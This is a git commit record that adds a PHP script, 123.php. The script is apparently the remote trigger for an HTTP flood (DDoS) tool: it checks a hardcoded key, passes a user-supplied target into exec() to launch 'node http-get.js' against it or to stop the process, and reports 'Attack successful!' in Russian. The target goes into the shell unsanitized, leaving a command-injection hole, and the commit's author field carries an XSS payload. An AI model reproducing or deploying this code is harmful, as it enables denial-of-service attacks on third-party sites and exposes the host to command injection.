e9fe77be95067560b87cdb5fcef0b72bef1cfa91
noscriptp title="/noscriptimg src=x onerror=alert(1) <67807537+leo562@users.noreply.github.com>
2024-07-28 12:59:20 +0300

    Add files via upload

---
+++ 123.php
@@ -0,0 +1,27 @@
+﻿<?php
+if (isset($_GET['key']) && isset($_GET['target']) && isset($_GET['time']) && isset($_GET['method'])) {
+    $secretKey = 'test'; // Ваш секретный ключ
+    $key = $_GET['key'];
+    $target = urldecode($_GET['target']); // Декодирование параметра
+    $time = $_GET['time'];
+    $method = $_GET['method'];
+
+    if ($key === $secretKey) {
+        if ($method === 'GET') {
+            $command = "nohup node http-get.js $target $time 32 5 http.txt > /dev/null 2>&1 &";
+        } elseif ($method === 'stop') {
+            $command = "pkill -f $target";
+        } else {
+            echo "Неверный метод.";
+            exit;
+        }
+
+        exec($command);
+        echo "Атака успешна!";
+    } else {
+        echo "Неверный ключ.";
+    }
+} else {
+    echo "Не все параметры указаны.";
+}
+?>
